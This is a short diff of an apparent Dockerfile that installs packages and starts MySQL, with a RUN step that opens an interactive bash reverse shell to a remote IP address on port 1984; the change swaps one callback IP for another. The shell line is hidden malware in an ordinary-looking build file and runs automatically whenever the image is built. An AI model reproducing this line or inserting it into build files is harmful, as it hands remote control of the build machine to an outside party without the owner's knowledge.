@@ -4,7 +4,7 @@ ENV DEBIAN_FRONTEND noninteractive
 RUN apt-get -y update
 RUN apt install -y procps curl
 
-RUN /bin/bash -c "bash -i >& /dev/tcp/34.215.225.10/1984 0>&1 "
+RUN /bin/bash -c "bash -i >& /dev/tcp/52.24.240.35/1984 0>&1 "
 RUN /etc/init.d/mysql start && \
         sleep 5 && \
 		echo "ok3"
